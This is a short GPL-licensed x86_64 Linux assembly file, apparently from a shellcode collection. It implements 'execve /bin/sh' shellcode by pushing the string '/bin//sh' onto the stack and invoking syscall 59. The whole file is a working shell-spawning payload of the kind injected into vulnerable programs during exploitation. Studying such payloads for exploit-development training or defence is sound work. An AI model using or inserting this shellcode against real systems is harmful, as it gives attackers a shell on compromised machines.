    #
    # Execve /bin/sh Shellcode Via Push (Linux x86_64)
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 27 April 2015
    #
    # GPL
    #


    .global _start
_start:
    xorl %esi, %esi
    movq $0x68732f2f6e69622f, %rbx
    pushq %rsi
    pushq %rbx

    pushq %rsp
    popq %rdi

    pushq $59
    popq %rax

    syscall
